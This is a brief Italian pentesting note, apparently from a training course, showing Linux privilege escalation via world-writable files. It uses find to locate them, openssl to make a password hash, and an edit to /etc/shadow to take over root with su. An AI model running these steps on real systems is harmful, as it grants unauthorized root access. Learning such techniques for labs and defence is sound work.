
# Linux Privilege Escalation Week Permissions
Dopo aver ottenuto una sessione su un target Linux, possiamo andare a cercare delle credenziali deboli:
```bash
find / -not -type l -perm -o+w            # mostra files che possono essere modiicati da tutti gli utenti nel sistema
# ser il sistema é mal configurato, potremmo trovare il file /etc/shadow modificabile quindi generiamo una password hashata e inseriamola nel file shadow
openssl passwd -1 -salt abc <password>
nano /etc/shadow
# rimuoviamo l'asterisco e al suo posto mettiamo la pasword hashata generata da openssl per poi collegarci a root
su
<password>
```
